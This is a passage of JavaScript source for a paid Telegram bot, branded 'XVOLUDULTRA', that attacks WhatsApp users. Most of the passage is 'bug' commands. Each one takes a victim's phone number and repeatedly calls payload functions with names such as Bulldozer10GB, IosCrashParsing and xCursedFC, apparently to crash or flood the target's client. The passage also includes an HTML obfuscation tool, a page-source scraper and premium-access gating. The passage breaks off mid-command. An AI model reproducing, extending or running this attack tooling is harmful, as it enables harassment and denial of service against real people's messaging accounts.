    return bot.sendMessage(chatId, "❌ ⵢ Format :  /getcode https://namaweb");
  }

  try {
    const response = await axios.get(url, {
      responseType: "text",
      headers: { "User-Agent": "Mozilla/5.0 (compatible; Bot/1.0)" },
      timeout: 20000
    });
    const htmlContent = response.data;

    const filePath = path.join(__dirname, "web_source.html");
    fs.writeFileSync(filePath, htmlContent, "utf-8");

    await bot.sendDocument(chatId, filePath, {
      caption: `✅ ⵢ Get Code By XcovzOfficial ( 🕷️ ) ${url}`
    });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "Error" + err);
  }
});

bot.onText(/\/enchtml(?:@[\w_]+)?$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from?.id;

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, "❌ ⵢ Please Reply File .html");
  }

  try {
    const fileId = msg.reply_to_message.document.file_id;
    const fileInfo = await bot.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;

    const response = await axios.get(fileUrl, { responseType: "arraybuffer" });
    const htmlContent = global.Buffer.from(response.data).toString("utf8");

    const encoded = global.Buffer.from(htmlContent, "utf8").toString("base64");
    const encryptedHTML = `<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title> 𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</title>
<script>
(function(){
  try { document.write(atob("${encoded}")); }
  catch(e){ console.error(e); }
})();
</script>
</head>
<body></body>
</html>`;

    const outputPath = path.join(__dirname, "encrypted.html");
    fs.writeFileSync(outputPath, encryptedHTML, "utf-8");

    await bot.sendDocument(chatId, outputPath, {
      caption: "✅ ⵢ Enc Html By XcovzOfficial ( 🕷️ )"
    });

    fs.unlinkSync(outputPath);
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "❌ ⵢ Error Saat Membuat Sticker");
  }
});

// Acces !!
bot.onText(/\/setcd (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ ⵢ Missing input. Please provide a user ID and duration. Example: /addprem ID 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ ⵢ Missing input. Please specify a duration. Example: /addprem ID 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ ⵢ Missing input. User ID must be a number. Example: /addprem ID 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ ⵢ Missing duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${senderId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ ⵢ User ${senderId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ ⵢ User ${senderId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner & Admin Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "❌ ⵢ No premium users found.");
  }

  let message = "<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>\nList - Premium\n\n";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "HTML" });
});

bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

  if (!isOwner(senderId)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ ⵢ Format : /addadmin ID.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ ⵢ Format : /addadmin ID.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${senderId} To Admin`);
        bot.sendMessage(chatId, `✅ ⵢ User ${senderId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ ⵢ User ${senderId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(msg.from.id) && !adminUsers.includes(msg.from.id)) {
        return bot.sendMessage(chatId, "❌ ⵢ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ ⵢ Please provide a user ID. Example: /delprem id");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ ⵢ Missing input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ ⵢ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ ⵢ User ${userId} has been removed from the premium list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

  if (!isOwner(msg.from.id)) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Owner Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ ⵢ Format : /deladmin id.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ ⵢ Format : /deladmin id.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ ⵢ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ ⵢ User ${userId} is not an admin.`);
    }
});

// ~ Case Bugs 1
bot.onText(/\/MentalHama (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ MentalHama
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 70; i++) {
    await xCursedFC(sock, target)
    await xCursedFC(sock, target)
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ MentalHama
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK TARGET ABANG KUHHH", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 2
bot.onText(/\/MentalBuaya (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ MentalBuaya
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 1000; i++) {
    await xCursedFC(sock, target)
    await xCursedFC(sock, target)
    await sleep(1000)
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ MentalBuaya
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK TARGET ABANG KUHHH", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 3
bot.onText(/\/Yanto (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Yanto
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 70; i++) {
    await VnXDelayInvisNewCta(sock, target)
    await VnXDelayInvisNewLagi(sock, target)
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }
        
    await bot.editMessageCaption(`
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Yanto
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK TARGET ABANG KUHHH", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Case Bugs 4
bot.onText(/\/Yanti (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Yanti
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 100; i++) {
    await Bulldozer10GB(sock, target)
    await Bulldozer10GB(sock, target)
    await sleep(1000)
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageCaption(`
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Yanti
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK TARGET ABANG KUHHH", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// case bug 5 \\
bot.onText(/\/MakLoe (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ MakLoe
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 200; i++) {
    await optCurse(sock, target)
    await modified(sock, target)
    await sleep(1000)
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }
        
    await bot.editMessageCaption(`
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ MakLoe
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK TARGET ABANG KUHHH", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// case bug 6 \\
bot.onText(/\/Hama (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Hama
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 200; i++) {
    await iosinVisFC3(sock, target)
    await IosCrashParsing(sock, target)
    await sleep(1000)
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }
        
    await bot.editMessageCaption(`
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Hama
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK TARGET ABANG KUHHH", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// case bug 7
bot.onText(/\/Amaterasu (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Amaterasu
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 200; i++) {
    await callinvisible(target)
    await sleep(1000)
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }
        
    await bot.editMessageCaption(`
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Amaterasu
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK TARGET ABANG KUHHH", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

// case bug
bot.onText(/\/Bencong (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
<b>Please Buy Acces To XcovzOfficial</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 OWNERS 」", url: "https://t.me/XcovzOfficial" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ ⵢ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Bencong 
⚚. バグステータス ⸸ Process 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, parse_mode: "HTML"
    });

    for (let i = 0; i < 100; i++) {
    await BakIyos(sock, target, pc = true) 
    await BakIyos(sock, target, pc = true) 
    await sleep(1000)
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }
        
    await bot.editMessageCaption(`
<blockquote><b>𝐗 𝐕 𝐎 𝐋 𝐔 𝐃 - 𝐔 𝐋 𝐓 𝐑 𝐀</b></blockquote>

⚚. ターゲット ⸸ ${target}
⚚. タイプ バグ ⸸ Bencong 
⚚. バグステータス ⸸ Succes 
⚚. 今すぐ日付 ⸸ ${date}

<b>XVOLUDULTRA VERSION 20</b>
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "CEK TARGET ABANG KUHHH", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ ⵢ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/AkuSange (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `❌ ⵢ Cooldown Online !!\n Please Wait For ${cooldown} Seconds To Send Another Message`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, imageThumbnail, {
      caption: `
<b>Premium Acces</b>
